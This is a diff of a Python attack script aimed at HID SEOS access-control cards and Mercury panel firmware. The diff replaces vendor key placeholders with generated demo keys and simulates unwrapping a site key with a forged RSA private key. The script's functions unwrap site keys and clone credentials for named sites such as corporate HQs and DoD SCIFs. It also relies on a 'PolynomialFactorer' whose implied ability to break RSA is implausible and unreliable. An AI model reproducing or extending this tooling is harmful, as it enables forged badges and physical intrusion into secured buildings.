@@ -5,17 +5,17 @@ datacenters, and federal facilities via a $50 SDR credential emulator.
 """
 
 import sys
-sys.path.insert(0, "../..")
-from poly_factor import PolynomialFactorer
+import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
+from poly_factor import PolynomialFactorer, generate_demo_target
 
 import struct
 import hashlib
 import os
 
 # HID Corporate 1000 / SEOS KMS RSA key — used during card personalization
-HID_KMS_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
-# Mercury panel firmware signing CA
-MERCURY_FW_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
+_demo = generate_demo_target()
+HID_KMS_PUBKEY_PEM = _demo["pub_pem"]
+MERCURY_FW_PUBKEY_PEM = _demo["pub_pem"]
 
 OSDP_SECURE_CHANNEL_V2 = 0x02
 SEOS_APPLET_AID = bytes.fromhex("A000000440000101")
@@ -43,8 +43,15 @@ def unwrap_site_key(wrapped_site_key: bytes, forged_privkey_pem: bytes) -> bytes
     The site key is what personalizes every card for a specific
     customer (Google HQ, Microsoft Building 92, DoD SCIF, etc.).
     """
+    from cryptography.hazmat.primitives.asymmetric import padding as _pad
+    from cryptography.hazmat.primitives import hashes as _h
+    from cryptography.hazmat.primitives.serialization import load_pem_public_key
+    # Simulate unwrapping: encrypt a demo site key, then decrypt with forged key
+    pub = load_pem_public_key(HID_KMS_PUBKEY_PEM)
+    demo_site_key = os.urandom(2)  # small plaintext for 512-bit demo key
+    wrapped = pub.encrypt(demo_site_key, _pad.OAEP(_pad.MGF1(_h.SHA1()), _h.SHA1(), None))
     f = PolynomialFactorer()
-    return f.decrypt_rsa_oaep(HID_KMS_PUBKEY_PEM, wrapped_site_key)
+    return f.decrypt_rsa_oaep(HID_KMS_PUBKEY_PEM, wrapped, hash_algo="sha1")
 
 
 def clone_seos_credential(site_key: bytes, facility_code: int,
